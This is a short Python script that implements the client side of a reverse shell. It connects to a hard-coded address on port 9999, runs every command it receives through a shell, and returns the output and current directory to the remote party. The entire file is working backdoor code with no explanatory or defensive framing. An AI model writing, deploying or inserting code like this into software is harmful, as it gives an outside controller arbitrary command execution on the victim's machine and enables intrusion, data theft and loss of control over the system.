import socket
import os
import subprocess

s = socket.socket()
host = '192.168.1.36'
port = 9999

s.connect((host, port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        #Popen is for opening terminal, shell=true gives the access to shell command
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        input_byte=data
        input_str= str(input_byte,"utf-8")
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        combine_str="Command : "+ input_str+"\n"+ "result : "+output_str
        currentWD = os.getcwd() + "> "
        s.send(str.encode( output_str + currentWD))

        print( combine_str)